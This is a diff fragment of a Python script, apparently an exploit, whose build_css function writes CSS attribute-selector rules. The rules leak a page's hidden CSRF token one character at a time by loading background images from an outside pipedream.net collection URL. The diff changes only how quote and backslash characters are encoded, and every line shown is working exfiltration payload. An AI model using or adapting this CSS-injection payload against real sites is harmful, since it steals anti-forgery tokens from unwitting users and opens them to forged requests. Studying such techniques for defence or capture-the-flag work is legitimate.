@@ -103,10 +103,10 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+'''["]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5B);}
         input[name="csrf"][value^="'''+chars+''']"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5D);}
         input[name="csrf"][value^="'''+chars+'''~"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''~);}
-        input[name="csrf"][value^="'''+chars+'''""]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%22);}
+        input[name="csrf"][value^="'''+chars+ bytearray.fromhex("22").decode() + '''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%22);}
         input[name="csrf"][value^="'''+chars+''''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%27);}
         input[name="csrf"][value^="'''+chars+'''`"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%60);}
-        input[name="csrf"][value^="'''+chars+'''\"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5C);}'''
+        input[name="csrf"][value^="'''+chars+ bytearray.fromhex("5C").decode()+'''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5C);}'''
         
         file.write(str+"\n\t"+str2) 
         file.close()
